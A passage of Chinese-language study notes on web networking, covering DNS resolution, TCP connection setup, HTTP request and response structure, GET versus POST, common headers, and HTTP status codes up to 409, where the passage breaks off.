那么这里又存在一个问题,DNS服务器是否和我们在同一个内网？若是先看arp缓存表,若有直接找,若没有直接arp,得到DNS服务器MAC地址,然后和DNS服务器通信。

若不是同一个内网,那么就直接arp网关,向网关发送访问DNS服务器的请求。然后由网关去路由、跳转等一系列路由,去找dns服务器。若是DNS服务器地址设置错误或自动获取错误,那么就没办法链接DNS服务器,自然就无法得到解析网址后的正确IP,就找不到网页了。所以平时发现QQ能上,但是网页打不开,很有可能就是DNS设置出了问题。

当找到DNS服务器地址后,数据包从udp53端口发出,发给本地DNS服务器,比如是北京的就发给北京的本地DNS服务器,这个DNS服务器查询自己的域名IP表,有就直接返回,没有就找根DNS服务器,根DNS服务器依次向下查询,根据url格式,比如是几级域名等,总之按照DNS服务器的一套详细的查询方法,最后会返回域名的正确地址

第三步:套接字,封装
已经得到了目标服务器的IP地址及访问的端口号(http80,https443),此时还处于TCP/IP五层模型中的应用层,浏览器会调用系统库函数sock。

源IP地址和目的IP地址以及源端口号和目的端口号的组合称为套接字。其用于标识客户端请求的服务器和服务

然后请求进入传输层,进行封装,接着网络层,数据链路层,根据已经知道的目的IP地址开始传输

TCP连接
在通过第一步的DNS域名解析后,获取到了服务器的IP地址,在获取到IP地址后便会开始建立一次连接,这是由TCP协议完成的,主要通过三次握手进行连接

HTTP请求
在确认与服务器建立连接后便会发送一个HTTP请求,HTTP请求的报文主要包括请求行、请求头、请求正文。
请求行的内容一般类似于:GET index.html HTTP/1.1

处理HTTP请求并响应
服务器在收到浏览器发送的HTTP请求之后,会将收到的HTTP报文封装成HTTP的Request对象,并通过不同的Web服务器进行处理,处理完的结果以HTTP的Response对象返回,主要包括状态码、响应头、响应报文三个部分。

页面渲染
页面DOM树的渲染是个复杂的过程,需要深入了解DOM原理

关闭连接
在页面元素传输完成后,会选择关闭连接,此时用到的是TCP四次挥手

</pre>

<h3>http协议</h3><pre>
HTTP全称HyperText Transfer Protocal,即超文本传输协议,从1990年开始就在WWW上广泛应用,是现今在WWW上应用最多的协议,HTTP 是应用层协议,上网浏览网页的时浏览器和web服务器之间就会通过HTTP在Internet上进行数据的发送和接收。HTTP 是一个基于请求/响应模式的、无状态的协议,即通常所说的Request/Response

特点
1、支持客户端/服务器模式
2、简单快速:客户向服务器请求服务时,只需传送请求方法和路径。由于 HTTP 协议简单,使得 HTTP 服务器的程序规模小,因而通信速度很快
3、灵活:HTTP 允许传输任意类型的数据对象。正在传输的类型由 Content-Type 加以标记
4、无连接:无连接的含义是限制每次链接只处理一个请求。服务器处理完哭护的请求,并收到客户的应答后,即断开链接,采用这种方式可以节省传输时间
5、无状态:HTTP 协议是无状态协议。无状态是指协议对于事物处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息,则它必须重传,这样可能会导致每次连接传送的数据量增大。另一方面,在服务器不需要先前信息时它的应答就较快


URL(Uniform Resource Locator)是统一资源定位符的简称,有时候也被俗称为网页地址(网址),如同是网络上的门牌,是因特网上标准的资源的地址

2、基本组成
通用的格式:schema://host[:port#]/path/…/[?query-string][#anchor]

名称  功能
schema  访问服务器以获取资源时要使用哪种协议,比如http,https和FTP等
host    HTTP服务器的IP地址或域名
port#   HTTP服务器的默认端口是80,此时可以省略,如果使用了别的端口必须指明,如www.cnblogs.com:8080
path    访问资源的路径
query-string  发给http服务器的数据
anchor        锚

www.mywebsite.com/sj/test/tes…
名称          对应的字段
Schema        http
host          www.mywebsite.com
path          /js/test/test.aspx
Query-string  name=sviergn&x=true
anchor        stuff

https:最安全
http是计算机通过网络进行通信的规则,是一种无状态的协议,即客户端和服务端不建立持久的连接,连接之后即关闭之后要重新请求

完整的http请求过程:
1.建立TCP连接
2.web浏览器向web服务器发送请求命令
3.web浏览器发送请求头信息
4.web服务器应答
5.web服务器发送应答头信息
6.web服务器向浏览器发送数据
7.web服务器关闭TCP连接

</pre>

<h3>http头文件的请求头和响应头</h3>
<textarea>http://bxu2359690171.my3w.com/index/sys/urlinfo

General
  Remote Address:60.205.36.34:80
  Request URL:http://bxu2359690171.my3w.com/index/sys/urlinfo
  Request Method:GET
  Status Code:200 OK

Response Header
  [view parsed]
  Connection:Keep-Alive
  Content-Encoding:gzip
  Content-Length:2515
  Content-Type:text/html
  Date:Wed, 02 Aug 2017 14:00:18 GMT
  Keep-Alive:timeout=15, max=300
  Server:Apache
  Vary:User-Agent,Accept-Encoding

  [view source]
  HTTP/1.1 200 OK
  Date: Wed, 02 Aug 2017 14:00:18 GMT
  Server: Apache
  Vary: User-Agent,Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 2515
  Keep-Alive: timeout=15, max=300
  Connection: Keep-Alive
  Content-Type: text/html

Request Header
  [view parsed]
  Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Encoding:gzip, deflate, sdch
  Accept-Language:zh-CN,zh;q=0.8
  Cache-Control:max-age=0
  Connection:keep-alive
  Cookie:PHPSESSID=uqjts1ad7evnn4m189dv017rf4; Hm_lvt_71238d5d26321ca3a21a98fce0ad7ecd=1501682202;
  Host:bxu2359690171.my3w.com
  Upgrade-Insecure-Requests:1
  User-Agent:Mozilla/5.0(Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36

  [view source]
  GET /index/sys/urlinfo HTTP/1.1
  Host: bxu2359690171.my3w.com
  Connection: keep-alive
  Cache-Control: max-age=0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0(Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
  Accept-Encoding: gzip, deflate, sdch
  Accept-Language: zh-CN,zh;q=0.8
  Cookie: PHPSESSID=uqjts1ad7evnn4m189dv017rf4; Hm_lvt_71238d5d26321ca3a21a98fce0ad7ecd=1501682202;

</textarea>

<h3>http协议-请求</h3><pre>
组成格式:请求行、消息报头、请求正文
HTTP请求报文分为三个部分:请求行、请求头、请求体

请求行   请求方法method  空格  请求地址path  空格  协议版本  \r\n
请求头   header1         :    value1                      \r\n
         header2         :    value2                      \r\n
         header3         :    value3                      \r\n
         headern         :    valuen                      \r\n
空行     \r\n
请求体   请求体

【 请求行(Request line) 】
请求行分为三个部分:请求方法、请求地址和协议版本

请求行实例:
GET / HTTP/1.1 CRLF(回车符)

请求方法
HTTP/1.1协议中共定义了八种方法(也叫"动作")来以不同的方式操作指定的资源
HTTP1.0定义了三种请求方法: GET, POST 和 HEAD方法。
HTTP1.1新增了五种请求方法:OPTIONS, PUT, DELETE, TRACE和CONNECT方法

1、GET
请求获取request-uri所标识的资源,这是一个幂等的方法,即使用相同的参数重复执行应该能够获取到相同的结果
使用GET方法应该只用在读取数据上,而不应该用于产生"副作用"的操作中

2、POST
在request-uri所标识的资源后附加新的数据,指定资源提交数据,请求服务器进行处理(例如提交表单或者上传文件),数据被包含在请求文本中
POST请求通常用来创建一个新的资源实体,也就是一个没有ID的资源,一旦这个请求成功执行就会在HTTP请求的响应中返回这个新创建的实体的id,或者修改现有资源,或两者皆有

3、PUT
请求服务器存储一个资源,并用reqest-url作为其标识
一般用来更新一个已有的实体,通过把已经存在的资源ID和新的实体用PUT请求上传的服务器来更新资源
无论进行多少次PUT操作,资源不会增加

put方法的参数是同post一样是存放在消息中的,同样具有安全性,可发送较大信息

put方法是幂等的,对同一URL资源做出的同一数据的任意次put请求其对数据的改变都是一致的。
比如更新/student/2的name值为bobdylan,不论提交该请求多少次,/student/2资源的name值会与提交一次请求无异

PUT和POST都可以用来创建和更新实体,但是通常更倾向于使用POST来创建,而使用PUT来更新已存在的实体
区别在于POST是作用在一个集合资源之上的(/uri),而PUT操作是作用在一个具体资源之上的(/uri/xxx),再通俗点说,如果URL可以在客户端确定那么就使用PUT,如果是在服务端确定那么就使用POST,比如说很多资源使用数据库自增主键作为标识信息,而创建的资源的标识信息到底是什么只能由服务端提供,这个时候就必须使用POST

因为大多数浏览器不支持put和delete,会自动将put和delete请求转化为get和post. 因此为了使用put和delete方法,需要以post发送请求,在表单中使用隐藏域发送真正的请求

4、HEAD
和GET请求类似,请求获取由request-uri所标识的资源的响应详细报头,只不过服务器将不传回资源的本文部分,如获取资源的创建或修改时间
HEAD也是幂等的,不会在服务器上造成其他影响
它的好处在于使用这个方法可以在不必传输全部内容的情况下,就可以获取其中关于该资源的信息(原信息或称元数据)

5、DELETE
请求服务器删除request-uri所标识的资源
Delete方法的参数同post一样存放在消息体中,具有安全性,可发送较大信息 Delete方法是幂等的,不论对同一个资源进行多少次delete请求都不会破坏数据
DELETE /books/123  # 删除服务器上ID为123的书

6、OPTIONS
请求查询服务器的性能或查询与资源相关的选项和需求,如获取服务器允许对资源进行哪些操作、服务所支持的HTTP请求方法
用*来代替资源名称,向Web服务器发送OPTIONS请求,可以测试服务器功能是否正常运作

7、TRACE
显示服务器收到的请求,会返回你发送的内容,主要用于测试或诊断

8、CONNECT
主要用来建立一个对资源的网络连接(通常请求一些能够把HTTP连接转发成为TCP连接并保持的代理)。一旦建立连接后会响应一个200状态码和一条"Connection Established"的消息
HTTP/1.1中预留给能够将连接改为通道方式的代理服务器。通常用于SSL加密服务器的链接(经由非加密的HTTP代理服务器)

其中最常见的是GET和POST方法,如果是RESful接口的话一般会用到 PUT、DELETE、GET、POST,分别对应增删查改

【 GET和POST的区别 】
GET:默认方式,一般用于获取查询数据信息,使用URL明文传递参数变量(把数据放置在HTTP协议头中),对发送信息的数量有限制,容量有限不适用传递大数据,不安全,有缓存,可以添加到书签

POST:一般用于添加或修改服务器上的资源,上传数据,对发送的信息数量无限制,参数信息存放在请求报文的消息体中相对安全,没缓存,如用户注册表单

使用场景:
get使用较方便,适用于页面之间非敏感数据的简单传值,
post使用较为安全,适用于向服务器发送密码、token等敏感数据

GET和POST对比
后退按钮         无害                                   数据会被重新提交(浏览器应告知)
书签             可收藏为书签                           不可收藏为书签
缓存             能被缓存                               不能被缓存
历史记录         参数保留在浏览器历史中                  参数不会保留在浏览器历史中
对数据类型的限制  只允许ASCII字符                        没限制,也允许二进制数据
对数据长度的限制  GET方法向URL添加数据,URL最长2048字符    无限制
安全性           不安全,所发送的数据是URL的一部分,可见    安全,参数不会被保存在浏览器历史或web服务日志中
编码类型         application/x-www-form-urlencoded     application/x-www-form-urlencoded或multipart/form-data,为二进制数据使用多重编码

GET在浏览器回退时是无害的,而POST会再次提交请求。
GET产生的URL地址可以被Bookmark,而POST不可以。
GET请求会被浏览器主动cache,而POST不会,除非手动设置。
GET请求只能进行url编码,而POST支持多种编码方式。
GET请求参数会被完整保留在浏览器历史记录里,而POST中的参数不会被保留。
GET请求在URL中传送的参数是有长度限制的,而POST么有。
对参数的数据类型,GET只接受ASCII字符,而POST没有限制。
GET比POST更不安全,因为参数直接暴露在URL上,所以不能用来传递敏感信息。
GET参数通过URL传递,POST放在Request body中

GET和POST是HTTP协议中的两种发送请求的方法,HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。
HTTP的底层是TCP/IP,所以GET和POST的底层也是TCP/IP,也就是说GET/POST都是TCP链接,GET和POST能做的事情是一样的。
给GET加上request body,给POST带上url参数,技术上是完全行的通的

在万维网世界中TCP就像汽车,用TCP来运输数据,它很可靠,从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车,那这个世界看起来是一团混乱,送急件的汽车可能被前面满载货物的汽车拦堵在路上,整个交通系统一定会瘫痪。
为了避免这种情况发生,交通规则HTTP诞生了。HTTP给汽车运输设定了好几个服务类别,有GET, POST, PUT, DELETE等等
HTTP规定当执行GET请求的时候,要给汽车贴上GET的标签(设置method为GET),而且要求把传送的数据放在车顶上(url中)以方便记录。如果是POST请求,就要在车上贴上POST的标签,并把货物放在车厢里。当然也可以在GET的时候往车厢内偷偷藏点货物,但是这是很不光彩;也可以在POST的时候在车顶上也放一些数据,让人觉得傻乎乎的。HTTP只是个行为准则,而TCP才是GET和POST怎么实现的基本。

但是只看到HTTP对GET和POST参数的传送渠道(url还是requrest body)提出了要求。"标准答案"里关于参数大小的限制又是从哪来的呢?

在万维网世界中还有另一个重要的角色:运输公司。不同的浏览器(发起http请求)和服务器(接受http请求)就是不同的运输公司。 虽然理论上可以在车顶上无限的堆货物(url中无限加参数)。但是运输公司可不傻,装货和卸货也是有很大成本的,他们会限制单次运输量来控制风险,数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是,大多数浏览器通常都会限制url长度在2K个字节,而大多数服务器最多处理64K大小的url,超过的部分恕不处理。如果用GET服务在request body偷偷藏了数据,不同服务器的处理方式也是不同的,有些服务器会帮你卸货,读出数据,有些服务器直接忽略,所以虽然GET可以带request body,也不能保证一定能被接收到

所以GET和POST本质上就是TCP链接,并无差别。但是由于HTTP的规定和浏览器/服务器的限制,导致他们在应用过程中体现出一些不同。

GET和POST还有一个重大区别,简单的说:GET产生一个TCP数据包;POST产生两个TCP数据包。
对于GET方式的请求,浏览器会把http header和data一并发送出去,服务器响应200(返回数据);
而对于POST,浏览器先发送header,服务器响应100 continue,浏览器再发送data,服务器响应200 ok(返回数据)。
也就是说,GET只需要汽车跑一趟就把货送到了,而POST得跑两趟,第一趟先去和服务器打个招呼"嗨,我等下要送一批货来,你们打开门迎接我",然后再回头把货送过去。

因为POST需要两步,时间上消耗的要多一点,看起来GET比POST更有效。但是用GET替换POST来优化网站性能,为什么?
1. GET与POST都有自己的语义,不能随便混用。
2. 在网络环境好的情况下,发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下,两次包的TCP在验证数据包完整性上,有非常大的优点。
3. 并不是所有浏览器都会在POST中发送两次包,Firefox就只发送一次。

【 请求头 】
请求头可用于传递一些附加信息,格式为:键: 值,注意冒号后面有一个空格,包含一些客户端环境信息,身份验证信息等

Request Headers
Accepet: */*
Origin: http://www.jianshu.com
User-Agent: Mozilla/5.0(Windows NT 10.0;WOW64) AppleWebkit/537.36(KHTML, like Gecho) Chrome/56.0.2924.87 Safari/537.36
x-write-version: 25
Content-Type: multipart/form-data;boundary=----WebkitFormBoundaryOi93qdWinWP4MSfy
Accept-Encoding: gzip,delate
Accept-Language: zh-CN,zh;q=0.8

请求和响应常见通用的Header
名称               作用
Content-Type      请求体/响应体的类型,如:text/plain、application/json
Accept            说明接收的类型,可以多个值,用英文逗号分开
Content-length    请求体/响应体的长度,单位字节
Content-Encoding  请求体/响应体的编码格式,如gzip、deflate
Accept-Encoding   告知对方我方接受的Content-Encoding
ETag              给当前资源的标识,和Last-Modified、If-None-Match、If-Modified-Since配合,用于缓存控制
Cache-Control     取值一般为no-cache、max-age=xx,xx为整数,表示资源缓存有效期(秒)

常见的请求Header
名称  作用
Authorization     用于设置身份认证信息
User-Agent        用户标识,如:OS 和浏览器的类型和版本
If-Modified-Since 上一次请求资源的缓存时间,值为上一次服务器返回的Last-Modified值,如果某个资源没有被更改过就从缓存中读取
If-None-Match     客户段缓存数据的唯一标识,值为上一次服务器返回的ETag值,一般会和If-Modified-Since
Cookie            客服端已有的Cookie
Referer           标识请求引用自哪个地址,比如从页面A跳转到页面B时值为页面A的地址
Host              请求的服务器地址(主机和端口号)
Accept            客户端支持的数据类型
Accept-Charset    客户端采用的编码
Accept-Encoding   客户端支持的数据压缩格式
Accept-Language   客户端的语言环境
Connection        客户端与服务连接类型
Pragma            是否缓存(http1.0提出)
Cache-Control     是否缓存(http1.1提出)

【 请求体 】
请求体,请求的正文,包含客户端提交的查询字符串信息或表单信息等
请求体(又叫请求正文)是post请求方式中的请求参数,以key = value形式进行存储,多个请求参数之间用&连接,如果请求当中请求体,那么在请求头当中的Content-Length属性记录的就是该请求体的长度

根据应用场景的不同,HTTP请求的请求体有三种不同的形式
第一种:
移动开发者常见的,请求体是任意类型的,服务器不会解析请求体,请求体的处理需要自己解析,如POST JSON的时候就是这类

第二种:
第二种和第三种都有固定的格式,是服务器端开发人员最先了解的两种。这里的格式要求就是URL中Query String的格式要求:多个键值对之间用&连接,键与值之间用=连接,且只能用ASCII字符,非ASCII字符需使用UrlEncode编码
key1=value1&key2=value2

第三种:
第三种请求体被分成多个部分,文件上传时会被使用,这种格式最先是被用于邮件传输中,每个字段/文件都被boundary(Content-Type中指定的)分成单独的段,每段以--加boundary开头,然后是该段的描述头,描述头之后空一行接内容,请求结束的标识为boundary后面加--

区分是否被当成文件的关键是Content-Disposition是否包含filename,因为文件有不同的类型,所以还要使用Content-Type指示文件的类型,如果不知道是什么类型取值可以为application/octet-stream表示文件是一个二进制的文件,如果不是文件则Content-Type可以省略

</pre>

<h3>HTTP协议-响应</h3><pre>
HTTP响应的格式除状态行(第一行)与请求报文的请求行不一样之外,其他的就格式而言是一样的,但排除状态行和请求行的区别,从Header上还是可以区分出HTTP请求和HTTP响应的区别的

组成格式:状态行、消息报头、响应正文

响应状态行   协议版本       空格  响应码         空格  协议版本  \r\n
响应头      header1         :    value1                       \r\n
            header2         :    value2                      \r\n
            header3         :    value3                      \r\n
            headern         :    valuen                      \r\n
空行        \r\n
响应体      响应体

状态行实例:
HTTP/1.1 200 OK

</pre>

<h4>状态码</h4><pre>
当浏览者访问一个网页时,浏览器会向网页所在服务器发出请求
当浏览器接收并显示网页前,此网页所在的服务器会返回一个包含HTTP状态码的信息头(server header)用以响应浏览器的请求,用来显示请求是否成功

HTTP状态码(HTTP Status Code)是用以表示网页服务器HTTP响应状态的3位数字代码。由RFC 2616规范定义的,并得到RFC 2518、RFC 2817、RFC 2295、RFC 2774、RFC 4918等规范扩展

http响应状态码:3位数,首位定义状态码的类型
1xx   信息类,表示收到浏览器请求,在进一步处理中
2xx   成功,表示用户请求被正确解释、理解、处理,如200 ok
3xx   重定向,表示请求没有成功,客户必须采取进一步的动作
4xx   客户端错误,表示客户端提交的请求有错误,如404 not found
5xx   服务器错误,表示服务器斌完成对请求的处理,如500

【 1xx: 信息 】
这一类型的状态码,代表请求已被接受,需要继续处理。这类响应是临时响应,只包含状态行和某些可选的响应头信息,并以空行结束。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码,所以除非在某些试验条件下,服务器禁止向此类客户端发送 1xx 响应。

100 Continue
客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收且仍未被拒绝,客户端应当继续发送请求的剩余部分,或者如果请求已经完成,忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应

101 Switching Protocols
服务器转换协议:服务器将遵从客户的请求转换到另外一种协议

服务器已经理解了客户端的请求,并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后,服务器将会切换到在Upgrade 消息头中定义的那些协议。
只有在切换新的协议更有好处的时候才应该采取类似措施。例如切换到新的HTTP 版本比旧版本更有优势或切换到一个实时且同步的协议以传送利用此类特性的资源

102 Processing
由WebDAV(RFC 2518)扩展的状态码,代表处理将被继续执行

103 Checkpoint
用于PUT或POST请求恢复失败时的恢复请求建议

【 2xx: 成功 】
这一类型的状态码,代表请求已成功被服务器接收、理解、并接受

200 OK
请求已成功,请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态

201 Created
请求已经被实现,而且有一个新的资源已经依据请求的需要而建立,且其URI已经随Location头信息返回。假如需要的资源无法及时建立的话应当返回'202 Accepted'

202 Accepted
服务器已接受请求,但尚未处理,最终该请求可能会也可能不会被执行。在异步操作的场合下没有比发送这个状态码更方便的做法了。
返回202状态码的响应的目的是允许服务器接受其他过程的请求(例如某个每天只执行一次的基于批处理的操作),而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息,以及指向处理状态监视器或状态预测的指针,以便用户能够估计操作是否已经完成

203 Non-Authoritative Information
服务器已成功处理了请求,但返回的实体头部元信息不是在原始服务器上有效的确定集合,而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或超集。例如包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的,而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的

204 No Content
服务器成功处理了请求,但不需要返回任何实体内容,并且希望返回更新了的元信息。响应可能通过实体头部的形式,返回新的或更新后的元信息。如果存在这些头部信息则应当与所请求的变量相呼应。
如果客户端是浏览器的话,那么用户浏览器应保留发送了该请求的页面,而不产生任何文档视图上的变化,即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。
由于204响应被禁止包含任何消息体,因此它始终以消息头后的第一个空行结尾
如果用户定期地刷新页面,而Server可以确定用户文档足够新,这个状态代码是很有用的

205 Reset Content
服务器成功处理了请求,且没有返回任何内容。但是与204响应不同,返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后立即重置表单,以便用户能够轻松地开始另一次输入。
与204响应一样,该响应也被禁止包含任何消息体,且以消息头后的第一个空行结束

206 Partial Content
服务器已成功处理了部分GET请求。类似于FlashGet或者迅雷这类HTTP下载工具都是使用此类响应实现断点续传或将一个大文档分解为多个下载段同时下载。
该请求必须包含Range头信息来指示客户端希望得到的内容范围,并且可能包含If-Range来作为请求条件。

响应必须包含如下的头部域:
Content-Range 用以指示本次响应中返回的内容的范围;如果是Content-Type为multipart/byteranges的多段下载则每一multipart段中都应包含Content-Range域用以指示本段的内容范围。假如响应中包含Content-Length,那么它的数值必须匹配它返回的内容范围的真实字节数。
Date
ETag 和/或 Content-Location,假如同样的请求本应该返回200响应。
Expires, Cache-Control,和/或 Vary,假如其值可能与之前相同变量的其他响应对应的值不同的话。

假如本响应请求使用了If-Range强缓存验证,那么本次响应不应该包含其他实体头;假如本响应的请求使用了If-Range弱缓存验证,那么本次响应禁止包含其他实体头;这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。
假如ETag或Last-Modified头部不能精确匹配则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。

207 Multi-Status
由WebDAV(RFC 2518)扩展的状态码,代表之后的消息体将是一个XML消息,并且可能依照之前子请求数量的不同,包含一系列独立的响应代码

【 3xx: 重定向 】
这类状态码代表需要客户端采取进一步的操作才能完成请求。通常这些状态码用来重定向,后续的请求地址(重定向目标)在本次响应的Location域中指明。
当且仅当后续的请求所使用的方法是GET或HEAD时,用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向(例如:A->A,或者A->B->C->A),因为这会导致服务器和客户端大量不必要的资源消耗。按照HTTP/1.0版规范的建议,浏览器不应自动访问超过5次的重定向

300 Multiple Choices
被请求的资源有一系列可供选择的回馈信息,每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。
除非这是一个HEAD请求,否则该响应应当包括一个资源特性及地址的列表的实体,以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力,自动作出最合适的选择。当然RFC2616规范并没有规定这样的自动选择该如何进行。
如果服务器本身已经有了首选的回馈选择,那么在Location中应当指明这个回馈的URI;浏览器可能会将这个Location值作为自动重定向的地址。此外除非额外指定否则这个响应也是可缓存的

301 Moved Permanently
被请求的资源已永久移动到新位置,并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定否则这个响应也是可缓存的。
新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求,否则响应的实体中应当包含指向新的URI的超链接及简短说明。
如果这不是一个GET或HEAD请求,因此浏览器禁止自动进行重定向,除非得到用户的确认,因为请求的条件可能因此发生变化。
对于某些使用HTTP/1.0协议的浏览器,当它们发送的POST请求得到了一个301响应的话,接下来的重定向请求将会变成GET方式。

302 Found
请求的资源临时从不同的URI响应请求。由于这样的重定向是临时的,客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下,这个响应才是可缓存的。
如果这不是一个GET或HEAD请求,那么浏览器禁止自动进行重定向,除非得到用户的确认,因为请求的条件可能因此发生变化。
虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法,但是很多现存的浏览器将302响应视作为303响应,并且使用GET方式访问在Location中规定的URI,而无视原先请求的方法。状态码303和307被添加了进来,用以明确服务器期待客户端进行何种反应

303 See Other
对应当前请求的响应可以在另一个URI上被找到,而且客户端应当采用GET的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时303响应禁止被缓存。当然第二个请求(重定向)可能被缓存。
许多HTTP/1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动,302状态码应该可以胜任,因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的

304 Not Modified
如果客户端发送了一个带条件的GET请求且该请求已被允许,而自上次访问以来或根据请求的条件文档的内容并没有改变则服务器应当返回这个状态码。304响应禁止包含消息体,因此始终以消息头后的第一个空行结尾。

该响应必须包含以下的头信息:
Date,除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则,那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去(正如RFC 2068中规定的一样),缓存机制将会正常工作。
ETag 和/或 Content-Location,假如同样的请求本应返回200响应。
Expires, Cache-Control,和/或Vary,假如其值可能与之前相同变量的其他响应对应的值不同的话。

假如本响应请求使用了强缓存验证,那么本次响应不应该包含其他实体头;否则(例如某个带条件的GET请求使用了弱缓存验证),本次响应禁止包含其他实体头;这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。
假如某个304响应指明了当前某个实体没有缓存,那么缓存系统必须忽视这个响应,并且重复发送不包含限制条件的请求。
假如接收到一个要求更新某个缓存条目的304响应,那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。

305 Use Proxy
被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息,接收者需要重复发送一个单独的请求,通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。
RFC 2068中没有明确305响应是为了重定向一个单独的请求,而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。

306 Switch Proxy
在最新版的规范中,306状态码已经不再被使用

307 Temporary Redirect
请求的资源临时从不同的URI响应请求。
新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求,否则响应的实体中应当包含指向新的URI的超链接及简短说明。因为部分浏览器不能识别307响应,因此需要添加上述必要信息以便用户能够理解并向新的URI发出访问请求。
如果这不是一个GET或者HEAD请求,那么浏览器禁止自动进行重定向,除非得到用户的确认,因为请求的条件可能因此发生变化。

308 Resume Incomplete
用于PUT或者POST请求恢复失败时的恢复请求建议

【 4xx: 客户端请求错误 】
这类的状态码代表了客户端看起来可能发生了错误,妨碍了服务器的处理。除非响应的是一个HEAD请求,否则服务器就应该返回一个解释当前错误状况的实体以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。
如果错误发生时客户端正在传送数据,那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前,客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据,服务器的TCP栈将向客户端发送一个重置数据包,以清除该客户端所有还未识别的输入缓冲,以免这些数据被服务器上的应用程序读取并干扰后者

400 Bad Request
语义有误,当前请求无法被服务器理解。除非进行修改,否则客户端不应该重复提交这个请求。
请求参数有误

401 Unauthorized
被请求的页面需要身份验证,客户端没提供或者身份验证失败
当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书,那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问,且浏览器已经至少尝试了一次验证,那么浏览器应当向用户展示响应中包含的实体信息,因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617

402 Payment Required
该状态码是为了将来可能的需求而预留的

403 Forbidden
服务器已经理解请求,但是拒绝执行。与401响应不同的是,身份验证并不能提供任何帮助,而且这个请求也不应该被重复提交。如果这不是一个HEAD请求,而且服务器希望能够讲清楚为何请求不能被执行,那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应,假如它不希望让客户端获得任何信息

404 Not Found
请求失败,请求的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话,应当使用410状态码来告知旧资源因为某些内部的配置机制问题,已经永久的不可用,而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。出现这个错误的最有可能的原因是服务器端没有这个页面

405 Method Not Allowed
请求行中指定的请求方法不能被用于请求相应的资源。该响应须返回一个Allow头信息用以表示当前资源能够接受的请求方法的列表
鉴于PUT,DELETE方法会对服务器上的资源进行写操作,因而绝大部分的网页服务器都不支持或在默认配置下不允许上述请求方法,对于此类请求均会返回405错误

406 Not Acceptable
请求的资源的内容特性无法满足请求头中的条件,因而无法生成响应实体。
除非这是一个HEAD请求,否则该响应就应当返回一个包含可以让用户或浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但规范中并没有定义任何作出此类自动选择的标准。

407 Proxy Authentication Required
与401响应类似,只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。参见RFC 2617

408 Request Timeout
请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改

409 Conflict
